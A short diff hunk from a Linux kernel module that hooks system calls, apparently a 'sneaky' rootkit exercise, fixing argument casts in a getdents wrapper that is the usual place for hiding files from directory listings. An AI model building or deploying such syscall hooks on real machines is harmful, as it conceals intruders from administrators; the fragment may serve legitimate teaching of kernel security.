@@ -57,7 +57,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 // DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     struct linux_dirent *d;
-    int nread = original_getdents((void *)regs->di, regs->si, regs->dx);
+    int nread = original_getdents(regs->di, (struct linux_dirent *)regs->si, regs->dx);
 
     if (nread == -1) {
         return -1;
